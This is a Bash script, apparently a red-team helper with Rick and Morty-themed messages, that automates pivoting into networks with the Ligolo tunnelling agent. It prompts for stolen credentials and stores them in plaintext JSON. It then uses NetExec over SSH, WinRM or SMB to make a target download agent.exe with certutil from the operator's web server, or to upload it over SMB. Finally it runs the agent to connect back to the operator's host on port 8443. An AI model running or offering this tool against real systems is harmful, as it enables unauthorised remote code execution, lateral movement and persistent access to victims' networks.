#!/bin/bash

CONFIG_FILE="pivot_config.json"

# Function to create or update the configuration file
update_config() {
    local pivot=$1

    # Check if the config file exists
    if [[ ! -f $CONFIG_FILE ]]; then
        echo "{}" > "$CONFIG_FILE"
    fi

    # Read the existing config
    config=$(cat "$CONFIG_FILE")

    # Check if the pivot already exists in the config
    if ! echo "$config" | jq -e ".[\"pivot_$pivot\"]" > /dev/null 2>&1; then
        # Prompt for pivot details and update the config
        read -p "Enter the username for pivot $pivot: " username
        read -p "Enter the password for pivot $pivot: " password
        read -p "Enter the target IP for pivot $pivot: " target_ip
        read -p "Enter your callback IP for pivot $pivot: " callback_ip
        read -p "Enter the port for the web server for pivot $pivot (e.g., 8000): " web_port

        # Add the pivot configuration
        config=$(echo "$config" | jq ". + {\"pivot_$pivot\": {\"username\": \"$username\", \"password\": \"$password\", \"target_ip\": \"$target_ip\", \"callback_ip\": \"$callback_ip\", \"web_port\": $web_port}}")
        echo "$config" > "$CONFIG_FILE"
        echo "Configuration for pivot $pivot has been saved."
    fi
}

# Function to execute commands for the selected protocol
execute_pivot() {
    local pivot=$1
    local protocol=$2

    # Read the config for the pivot
    config=$(cat "$CONFIG_FILE" | jq -r ".pivot_$pivot")

    if [[ "$config" == "null" ]]; then
        echo "No configuration found for pivot $pivot. Please set it up first."
        exit 1
    fi

    # Extract details from the config
    username=$(echo "$config" | jq -r ".username")
    password=$(echo "$config" | jq -r ".password")
    target_ip=$(echo "$config" | jq -r ".target_ip")
    callback_ip=$(echo "$config" | jq -r ".callback_ip")
    web_port=$(echo "$config" | jq -r ".web_port")

    # Start the web server if using SSH or WINRM
    if [[ "$protocol" == "ssh" || "$protocol" == "winrm" ]]; then
        echo "Opening portal to /opt/ligolo on port $web_port..."
        (cd /opt/ligolo && python3 -m http.server "$web_port" > /dev/null 2>&1 & echo $!) > web_server.pid
    fi

    # Execute commands based on the protocol
    case $protocol in
        ssh)
            echo "Opening portal to send Morty to pivot $pivot..."
            nxc ssh "$target_ip" -u "$username" -p "$password" -x "certutil -urlcache -split -f http://$callback_ip:$web_port/agent.exe agent.exe" > /dev/null 2>&1
            echo "Morty is attempting to communicate back to Rick..."
            nxc ssh "$target_ip" -u "$username" -p "$password" -x "agent.exe -connect $callback_ip:8443 -ignore-cert" > /dev/null 2>&1
            ;;
        winrm)
            echo "Opening portal to send Morty to pivot $pivot..."
            nxc winrm "$target_ip" -u "$username" -p "$password" -x "certutil -urlcache -split -f http://$callback_ip:$web_port/agent.exe agent.exe" > /dev/null 2>&1
            echo "Morty is attempting to communicate back to Rick..."
            nxc winrm "$target_ip" -u "$username" -p "$password" -x "agent.exe -connect $callback_ip:8443 -ignore-cert" > /dev/null 2>&1
            ;;
        smb)
            echo "Opening portal to send Morty to pivot $pivot..."
            nxc smb "$target_ip" -u "$username" -p "$password" --put-file /opt/ligolo/agent.exe \\Windows\\Temp\\agent.exe > /dev/null 2>&1
            echo "Morty is attempting to communicate back to Rick..."
            nxc smb "$target_ip" -u "$username" -p "$password" -x "C:\\Windows\\Temp\\agent.exe -connect $callback_ip:8443 -ignore-cert" > /dev/null 2>&1
            ;;
        *)
            echo "Unsupported protocol: $protocol. Please use ssh, winrm, or smb."
            ;;
    esac

    # Stop the web server if it was started
    if [[ "$protocol" == "ssh" || "$protocol" == "winrm" ]]; then
        echo "Closing the portal to port $web_port..."
        if [[ -f web_server.pid ]]; then
            web_server_pid=$(cat web_server.pid)
            kill "$web_server_pid" && echo "Portal closed successfully." || echo "Failed to close the portal."
            rm web_server.pid
        else
            echo "Web server PID file not found."
        fi
    fi
}

# Main script logic
read -p "Enter the pivot number (e.g., 1, 2, 3): " pivot
read -p "Enter the protocol (ssh/smb/winrm): " protocol

# Validate the protocol input
if [[ ! "$protocol" =~ ^(ssh|smb|winrm)$ ]]; then
    echo "Invalid protocol: $protocol. Please choose ssh, smb, or winrm."
    exit 1
fi

# Check if the pivot is configured; if not, set it up
update_config "$pivot"

# Execute the commands for the selected protocol
execute_pivot "$pivot" "$protocol"

echo "All Portals have been completed."

